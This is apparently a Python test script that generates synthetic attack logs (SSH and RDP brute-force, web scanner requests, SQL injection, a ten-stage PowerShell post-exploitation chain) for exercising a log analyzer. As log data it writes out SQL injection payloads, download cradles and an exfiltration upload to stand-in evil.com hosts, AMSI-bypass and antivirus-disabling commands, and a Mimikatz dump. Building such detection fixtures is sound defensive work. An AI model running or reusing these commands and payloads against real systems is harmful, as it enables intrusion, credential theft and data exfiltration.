#!/usr/bin/env python3
"""
Multi-Attack Scenario Generator

Simulates a realistic attack chain from 12 threat actors:
  - SSH brute-force from multiple countries
  - Nmap, Nikto, DirBuster web scanning
  - SQL injection campaign (sqlmap + manual)
  - Full post-exploitation PowerShell chain
  - RDP brute-force on Windows
  - Legitimate traffic for contrast

Usage (from project root):
    python3 tests/generate_attack_scenario.py
    python3 analyzer.py -d tests/attack_scenario/ -o attack_report.html
    open attack_report.html
"""

import os
import random
from datetime import datetime, timedelta

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
OUTPUT_DIR = os.path.join(SCRIPT_DIR, "attack_scenario")
os.makedirs(OUTPUT_DIR, exist_ok=True)

BASE = datetime(2026, 2, 16, 6, 0, 0)


def ts_ssh(dt):
    return dt.strftime("%b %d %H:%M:%S")

def ts_web(dt):
    return dt.strftime("%d/%b/%Y:%H:%M:%S +0000")

def ts_win(dt):
    return dt.strftime("%Y-%m-%dT%H:%M:%S")


# ============================================================
#  1. AUTH.LOG — SSH brute-force from 4 different IPs
# ============================================================
ssh = []

# Legitimate logins
for h in [7, 8, 9, 12, 14, 17]:
    t = BASE.replace(hour=h, minute=random.randint(0, 30))
    ssh.append(f"{ts_ssh(t)} prod-web01 sshd[{random.randint(1000,9999)}]: Accepted publickey for deployer from 10.0.0.5 port {random.randint(40000,60000)} ssh2")
    t2 = t + timedelta(minutes=random.randint(1, 10))
    ssh.append(f"{ts_ssh(t2)} prod-web01 sshd[{random.randint(1000,9999)}]: Accepted password for admin from 10.0.0.10 port 22 ssh2")

# Attacker 1: 203.0.113.50 — Aggressive brute-force (45 attempts)
t = BASE.replace(hour=8, minute=12)
for i, user in enumerate(["root"]*20 + ["admin"]*10 + ["test", "oracle", "postgres", "mysql",
                           "guest", "www-data", "backup", "deploy", "jenkins",
                           "nagios", "ftpuser", "pi", "ec2-user", "ubuntu", "git"]):
    t += timedelta(seconds=random.randint(1, 3))
    invalid = "invalid user " if user not in ["root", "admin", "ubuntu"] else ""
    ssh.append(f"{ts_ssh(t)} prod-web01 sshd[{2400+i}]: Failed password for {invalid}{user} from 203.0.113.50 port {43210+i} ssh2")
# Success after brute-force
t += timedelta(seconds=2)
ssh.append(f"{ts_ssh(t)} prod-web01 sshd[2499]: Accepted password for root from 203.0.113.50 port 43299 ssh2")

# Attacker 2: 198.51.100.23 — Medium brute-force (15 attempts)
t = BASE.replace(hour=9, minute=45)
for i in range(15):
    t += timedelta(seconds=random.randint(2, 5))
    user = random.choice(["root", "admin", "deploy", "ubuntu"])
    ssh.append(f"{ts_ssh(t)} prod-web01 sshd[{3500+i}]: Failed password for {user} from 198.51.100.23 port {55000+i} ssh2")

# Attacker 3: 185.220.101.34 (Tor exit) — Fast brute-force (25 attempts)
t = BASE.replace(hour=11, minute=30)
for i in range(25):
    t += timedelta(seconds=random.randint(1, 2))
    user = random.choice(["root", "admin", "test", "guest", "info", "support", "user"])
    invalid = "invalid user " if user in ["test", "guest", "info", "support", "user"] else ""
    ssh.append(f"{ts_ssh(t)} prod-web01 sshd[{5000+i}]: Failed password for {invalid}{user} from 185.220.101.34 port {60000+i} ssh2")

# Attacker 4: 192.0.2.100 — Slow & low (evasion, 8 attempts over hours)
t = BASE.replace(hour=6, minute=0)
for i in range(8):
    t += timedelta(minutes=random.randint(20, 45))
    ssh.append(f"{ts_ssh(t)} prod-web01 sshd[{6000+i}]: Failed password for root from 192.0.2.100 port {61000+i} ssh2")

with open(f"{OUTPUT_DIR}/auth.log", "w") as f:
    f.write("\n".join(ssh) + "\n")
print(f"[+] auth.log: {len(ssh)} lines")


# ============================================================
#  2. ACCESS.LOG — Web scanning + SQL injection
# ============================================================
web = []

# Legitimate traffic throughout the day
pages = ["/", "/index.html", "/about", "/contact", "/login", "/dashboard",
         "/api/status", "/style.css", "/main.js", "/images/logo.png"]
for h in range(7, 22):
    for _ in range(random.randint(3, 8)):
        t = BASE.replace(hour=h, minute=random.randint(0, 59))
        web.append(f'{random.choice(["10.0.0.5","10.0.0.12","10.0.0.20"])} - - [{ts_web(t)}] "GET {random.choice(pages)} HTTP/1.1" 200 {random.randint(1000,15000)} "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"')

# Scanner 1: 203.0.113.77 — Nmap (33 paths)
t = BASE.replace(hour=9, minute=15)
for path in ["/", "/admin", "/wp-admin", "/wp-login.php", "/phpmyadmin",
             "/.env", "/.git/config", "/phpinfo.php", "/server-status",
             "/actuator", "/console", "/debug", "/shell", "/backup",
             "/api/swagger", "/.htaccess", "/.htpasswd", "/config.php",
             "/web.config", "/robots.txt", "/sitemap.xml", "/cgi-bin/",
             "/manager/html", "/solr/", "/jenkins", "/jmx-console",
             "/admin/config", "/.svn/entries", "/.DS_Store", "/elmah.axd",
             "/trace.axd", "/wp-content/uploads/", "/wp-includes/"]:
    t += timedelta(seconds=1)
    web.append(f'203.0.113.77 - - [{ts_web(t)}] "GET {path} HTTP/1.1" {random.choice([200,403,404,404,404])} {random.randint(200,5000)} "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"')

# Scanner 2: 192.0.2.200 — Nikto (20 paths)
t = BASE.replace(hour=11, minute=0)
for path in ["/", "/admin", "/wp-admin", "/cgi-bin/", "/test", "/.env",
             "/backup", "/config", "/phpinfo.php", "/phpmyadmin",
             "/console", "/debug", "/server-status", "/shell",
             "/api/swagger", "/.git/config", "/xmlrpc.php",
             "/wp-cron.php", "/license.txt", "/readme.html"]:
    t += timedelta(seconds=1)
    web.append(f'192.0.2.200 - - [{ts_web(t)}] "GET {path} HTTP/1.1" {random.choice([200,403,404,404])} {random.randint(200,3000)} "-" "Nikto/2.1.6"')

# Scanner 3: 172.16.50.99 — DirBuster (35 paths)
t = BASE.replace(hour=13, minute=20)
for path in ["/admin", "/administrator", "/admin1", "/admin2", "/backup",
             "/bak", "/conf", "/config", "/cp", "/cpanel", "/dashboard",
             "/db", "/debug", "/dev", "/files", "/hidden", "/include",
             "/internal", "/log", "/logs", "/manage", "/manager", "/misc",
             "/old", "/panel", "/private", "/secret", "/server", "/setup",
             "/sql", "/staging", "/temp", "/test", "/tmp", "/upload"]:
    t += timedelta(seconds=1)
    web.append(f'172.16.50.99 - - [{ts_web(t)}] "GET {path} HTTP/1.1" 404 289 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"')

# SQLi attacker 1: 198.51.100.44 — sqlmap campaign (20 payloads)
t = BASE.replace(hour=10, minute=30)
for payload in [
    "/search?q=1' OR '1'='1",
    "/search?q=1 UNION SELECT username,password FROM users--",
    "/search?q=1; DROP TABLE users--",
    "/search?q=1 AND SLEEP(5)--",
    "/search?q=admin'--",
    "/search?q=1 UNION SELECT LOAD_FILE('/etc/passwd')--",
    "/search?q=1; SELECT CONCAT(username,0x3a,password) FROM users--",
    "/search?q=1 AND 1=1--",
    "/search?q=1 AND BENCHMARK(10000000,SHA1('test'))--",
    "/search?q=1' GROUP BY id HAVING 1=1--",
    "/users?id=1 OR 1=1",
    "/products?cat=1 UNION SELECT null,table_name FROM information_schema.tables--",
    "/api/users?filter=1; EXEC xp_cmdshell('whoami')--",
    "/page?id=1' AND (SELECT COUNT(*) FROM users)>0--",
    "/news?id=-1 UNION SELECT 1,2,GROUP_CONCAT(table_name) FROM information_schema.tables--",
    "/profile?id=1; UPDATE users SET role='admin' WHERE id=1--",
    "/search?q=' OR ''='",
    "/items?sort=name; WAITFOR DELAY '0:0:5'--",
    "/api/data?q=1' UNION ALL SELECT credit_card,cvv FROM payments--",
    "/login?user=admin'%20OR%20'1'='1'--&pass=x",
]:
    t += timedelta(seconds=random.randint(2, 8))
    web.append(f'198.51.100.44 - - [{ts_web(t)}] "GET {payload} HTTP/1.1" {random.choice([200,200,500])} {random.randint(200,8000)} "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"')

# SQLi attacker 2: 45.33.32.156 — Manual SQLi (different IP)
t = BASE.replace(hour=15, minute=10)
for payload in [
    "/login?user=admin' OR '1'='1'--&pass=anything",
    "/search?q='; DROP TABLE orders;--",
    "/api/v1/users?id=1 UNION SELECT 1,password FROM admins--",
]:
    t += timedelta(seconds=30)
    web.append(f'45.33.32.156 - - [{ts_web(t)}] "GET {payload} HTTP/1.1" 200 4000 "-" "Mozilla/5.0 (X11; Linux x86_64)"')

with open(f"{OUTPUT_DIR}/access.log", "w") as f:
    f.write("\n".join(web) + "\n")
print(f"[+] access.log: {len(web)} lines")


# ============================================================
#  3. WINDOWS EVENT LOG — RDP brute-force + PowerShell chain
# ============================================================
win = ["# EventID|TimeCreated|Computer|Message"]

# Legitimate Windows activity
for h in [7, 8, 9, 12, 13, 14, 17]:
    t = BASE.replace(hour=h, minute=random.randint(0, 30))
    win.append(f"4624|{ts_win(t)}|DC01|An account was successfully logged on. Account Name: john.doe Source Network Address: 10.0.0.15")
    win.append(f"4672|{ts_win(t + timedelta(seconds=1))}|DC01|Special privileges assigned to new logon. Account Name: john.doe")

# RDP brute-force 1: 172.16.0.50 (20 attempts)
t = BASE.replace(hour=8, minute=30)
for user in ["Administrator"]*8 + ["admin"]*5 + ["svc_backup", "svc_sql", "krbtgt",
             "Guest", "sa", "test", "support"]:
    t += timedelta(seconds=random.randint(1, 3))
    win.append(f"4625|{ts_win(t)}|DC01|An account failed to log on. Account Name: {user} Source Network Address: 172.16.0.50")

# RDP brute-force 2: 10.99.88.77 (12 attempts)
t = BASE.replace(hour=14, minute=15)
for i in range(12):
    t += timedelta(seconds=2)
    win.append(f"4625|{ts_win(t)}|DC01|An account failed to log on. Account Name: {random.choice(['Administrator','admin','backup_svc'])} Source Network Address: 10.99.88.77")

# === FULL POST-EXPLOITATION CHAIN ===
t = BASE.replace(hour=10, minute=15)

# Stage 1: Encoded download cradle
win.append(f"4688|{ts_win(t)}|WS01|A new process has been created. Account Name: compromised_user Process: powershell.exe -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA== Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/stage1.ps1')")

# Stage 2: Mimikatz credential dump
t += timedelta(minutes=1)
win.append(f"4688|{ts_win(t)}|WS01|A new process has been created. Account Name: compromised_user Process: powershell.exe Invoke-Mimikatz -DumpCreds")

# Stage 3: Disable antivirus
t += timedelta(minutes=1)
win.append(f"4688|{ts_win(t)}|WS01|A new process has been created. Account Name: compromised_user Process: powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true")

# Stage 4: AMSI bypass
t += timedelta(seconds=30)
win.append(f"4688|{ts_win(t)}|WS01|A new process has been created. Account Name: compromised_user Process: powershell.exe [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') AMSI bypass executed")

# Stage 5: Reflective loading
t += timedelta(seconds=30)
win.append(f"4688|{ts_win(t)}|WS01|A new process has been created. Account Name: compromised_user Process: powershell.exe [System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://evil.com/payload.dll'))")

# Stage 6: Lateral movement
t += timedelta(minutes=2)
win.append(f"4688|{ts_win(t)}|WS02|A new process has been created. Account Name: compromised_user Process: powershell.exe Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/lateral.ps1')")

# Stage 7: Backdoor account creation
t += timedelta(minutes=1)
win.append(f"4720|{ts_win(t)}|DC01|A user account was created. Account Name: svc_update$ Source Network Address: 172.16.0.50")
win.append(f"4732|{ts_win(t + timedelta(seconds=1))}|DC01|A member was added to a security-enabled local group. Account Name: svc_update$ Group: Administrators")

# Stage 8: Persistence service
t += timedelta(minutes=2)
win.append(f"7045|{ts_win(t)}|WS01|A service was installed in the system. Service Name: WindowsUpdateHelper Account Name: SYSTEM")

# Stage 9: AV exclusion
t += timedelta(seconds=30)
win.append(f"4688|{ts_win(t)}|WS01|A new process has been created. Account Name: SYSTEM Process: powershell.exe Add-MpPreference -ExclusionPath 'C:\\Windows\\Temp\\updates'")

# Stage 10: Data exfiltration
t += timedelta(minutes=5)
win.append(f"4688|{ts_win(t)}|WS01|A new process has been created. Account Name: compromised_user Process: powershell.exe Invoke-WebRequest -Uri 'http://exfil.evil.com/upload' -Method POST -InFile 'C:\\sensitive_data.zip'")

with open(f"{OUTPUT_DIR}/windows_events.log", "w") as f:
    f.write("\n".join(win) + "\n")
print(f"[+] windows_events.log: {len(win)} lines")


# ============================================================
total = len(ssh) + len(web) + len(win)
print(f"""
{'='*55}
  ATTACK SCENARIO GENERATED — {total} log lines
{'='*55}

  Threat actors:
   SSH:  203.0.113.50 / 198.51.100.23 / 185.220.101.34 / 192.0.2.100
   Web:  203.0.113.77 (Nmap) / 192.0.2.200 (Nikto) / 172.16.50.99 (DirBuster)
   SQLi: 198.51.100.44 (sqlmap) / 45.33.32.156 (manual)
   RDP:  172.16.0.50 / 10.99.88.77
   Post-exploitation: compromised_user on WS01/WS02

  Next steps:
    python3 analyzer.py -d attack_scenario/ -o attack_report.html
    open attack_report.html
""")
